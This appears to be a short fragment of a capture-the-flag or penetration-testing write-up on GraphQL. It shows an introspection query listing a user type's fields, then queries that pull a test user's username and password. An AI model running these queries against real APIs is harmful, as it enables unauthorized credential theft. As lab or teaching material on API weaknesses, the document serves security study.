```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

```
{
"query":"{user(username: \"test\") { id username msg role}}"
}
```
- Response shows that the user object contains password, so let's query it.

```
{
"query":"{user(username: \"test\") {username password}}"
}
```
